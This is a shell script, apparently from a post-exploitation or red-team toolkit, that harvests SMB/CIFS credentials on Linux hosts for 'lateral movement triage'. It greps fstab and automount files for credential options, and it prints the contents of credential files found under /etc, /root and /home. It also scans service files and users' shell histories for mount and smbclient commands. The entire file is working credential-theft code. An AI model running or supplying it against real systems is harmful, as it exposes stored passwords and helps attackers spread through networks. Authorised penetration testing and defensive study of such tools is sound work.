#!/bin/sh
# gather/linux/enum-cifs-creds.sh — Enumerate SMB/CIFS mount credentials and target shares
# Requires: read access to /etc and user homes
# Read-only: YES
# MITRE ATT&CK: T1552 / T1021.002

homes() {
  cut -d: -f6 /etc/passwd 2>/dev/null | sort -u
}

echo "=== OBJECTIVE ==="
echo "Collect SMB/CIFS mount targets, credential references, and share-access artifacts for lateral movement triage."

echo ""
echo "=== FSTAB_AND_CREDENTIAL_REFS ==="
for f in /etc/fstab /etc/auto.master /etc/auto.smb /etc/auto.cifs /etc/mtab; do
  [ -f "$f" ] || continue
  echo "--- $f ---"
  grep -nEi 'cifs|smb|credentials=|user=|username=|domain=|vers=' "$f" 2>/dev/null
 done

echo ""
echo "=== LIVE_CIFS_MOUNTS ==="
mount 2>/dev/null | grep -Ei ' type cifs |//'
cat /proc/mounts 2>/dev/null | grep -Ei ' cifs |//'

echo ""
echo "=== CREDENTIAL_FILES ==="
find /etc /root /home -maxdepth 4 \( -iname '*smb*cred*' -o -iname '*cifs*cred*' -o -iname '.smbcredentials' -o -iname 'credentials' \) 2>/dev/null | sort | while IFS= read -r f; do
  echo "--- $f ---"
  sed -n '1,40p' "$f" 2>/dev/null
 done

echo ""
echo "=== CIFS_CONFIG_ARTIFACTS ==="
find /etc /root /home -maxdepth 4 \( -name '*.conf' -o -name '*.ini' -o -name '*.mount' -o -name '*.service' -o -name '*.sh' \) 2>/dev/null | while IFS= read -r f; do
  grep -qEi 'mount[[:space:]].*-t[[:space:]]+cifs|//[^/]+/|credentials=' "$f" 2>/dev/null || continue
  echo "--- $f ---"
  grep -nEi 'mount[[:space:]].*-t[[:space:]]+cifs|//[^/]+/|credentials=|user(name)?=|domain=|vers=' "$f" 2>/dev/null | head -80
 done

echo ""
echo "=== USER_HISTORY_CIFS_HITS ==="
homes | while IFS= read -r d; do
  for f in .bash_history .zsh_history .sh_history; do
    [ -f "$d/$f" ] || continue
    hits=$(grep -inEi 'mount[[:space:]].*-t[[:space:]]+cifs|mount[[:space:]].*//|smbclient|cifs-utils|credentials=' "$d/$f" 2>/dev/null | tail -40)
    [ -n "$hits" ] && echo "--- $d/$f ---" && echo "$hits"
  done
 done
